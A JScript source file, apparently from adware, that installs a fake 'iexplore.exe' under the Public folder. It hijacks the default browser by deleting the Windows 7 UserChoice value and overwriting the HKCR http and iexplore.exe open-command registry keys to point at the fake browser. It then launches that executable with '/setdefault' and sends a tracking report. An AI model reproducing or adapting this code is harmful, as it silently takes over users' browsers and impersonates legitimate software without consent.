///////

function LnchInTime() {}

function LnchInTime.GetFakeIEPath()
{
	var publicPath = __WshShell.ExpandEnvironmentStrings("%PUBLIC%")
	if (!publicPath)
	{
		var nCSIDL_COMMON_APPDATA = 35 //CSIDL_COMMON_APPDATA(0x0023)
		publicPath = __storage.GetFolderPath(0, nCSIDL_COMMON_APPDATA, 0, 0)
	}

	return publicPath + "\\iexplorer\\program\\iexplore.exe"
	// return "E:\\project\\COM_B\\googlecode\\trunk\\code\\YBYL\\Debug\\iexplore.exe"
}

function LnchInTime.DoSetDefaultBrowser()
{
	if (CommonFun.IsWin7())
	{
		var userChoiceReg = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\\Progid"
		var userChoice = CommonFun.RegQueryValue(userChoiceReg)
		if (userChoice)
		{
			CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRProgid", userChoice, "REG_SZ")
		}
		CommonFun.RegDelValue(userChoiceReg)
	}
	
	var sDefBrowRegPath = "HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\"
	var sOldDefBrowPath = CommonFun.RegQueryValue(sDefBrowRegPath)
	
	if (!sOldDefBrowPath)
	{
		CommonFun.log("[DoSetDefaultBrowser] sOldDefBrowPath is null")
		return false
	}
	
	//FunctionObj.GetExePath()//获取伪IE路径
	var sFakeIEPath = LnchInTime.GetFakeIEPath() 
	if (!sFakeIEPath)
	{
		CommonFun.log("[DoSetDefaultBrowser]sFakeIEPath is null")
		return false
	}
	if (!CommonFun.QueryFileExists(sFakeIEPath))
	{
		CommonFun.log("[DoSetDefaultBrowser] sFakeIEPath exe is not exists!")
		return false
	}
	if (sOldDefBrowPath.indexOf(sFakeIEPath) > 0)
	{
		CommonFun.log("[DoSetDefaultBrowser] sOldDefBrowPath is sFakeIEPath")
		return false
	}
	
	CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRHttp", sOldDefBrowPath, "REG_SZ")
	var sCommand = "\"" + sFakeIEPath + "\"  \"%1\""
	CommonFun.RegSetValue(sDefBrowRegPath, sCommand, "REG_SZ")
	
	var sIERegPath = "HKEY_CLASSES_ROOT\\Applications\\iexplore.exe\\shell\\open\\command\\"
	var sOldIEPath = CommonFun.RegQueryValue(sIERegPath)
	if (!sOldIEPath)
	{
		CommonFun.log("[DoSetDefaultBrowser] [sOldIEPath] is nil")
		return false
	}
	if (sOldIEPath.indexOf(sFakeIEPath) > 0)
	{
		CommonFun.log("[DoSetDefaultBrowser] has set default browser -- Applications")
		return false
	}
	
	CommonFun.RegSetValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\HKCRAppIE", sOldIEPath, "REG_SZ")
	CommonFun.RegSetValue(sIERegPath, sCommand, "REG_SZ")
	
	return true
}

function LnchInTime.Main()
{
	var objCloudCount = new ClassCloudCount()
	objCloudCount.Increase("yb DoSetDefaultBrowser enter")
	
	//抢默认浏览器相关注册表操作放到IE Onload.lua里做
	// var bSucc = LnchInTime.DoSetDefaultBrowser()
	var sFakeIEPath = LnchInTime.GetFakeIEPath()
	if (sFakeIEPath)
	{
		sFakeIEPath = "\"" + sFakeIEPath + "\"" + " /setdefault"
		CommonFun.log("get sFakeIEPath succ: " + sFakeIEPath)
		
		try        
		{   
          __WshShell.run(sFakeIEPath) 
		}        
		catch(e)     
		{     
            // alert('找不到文件"'+sFakeIEPath+'"(或它的组件之一)。请确定路径和文件名是否正确.')        
		}   
		
		var tReport = {}
		tReport.EC = "iefmain"
		tReport.EA = "setDefaultBrowser"
		CommonFun.SendReport(tReport)
	}else
	{
		CommonFun.log("get sFakeIEPath failed: ")
	}
	objCloudCount.Decrease("yb DoSetDefaultBrowser enter")
}

LnchInTime.Main()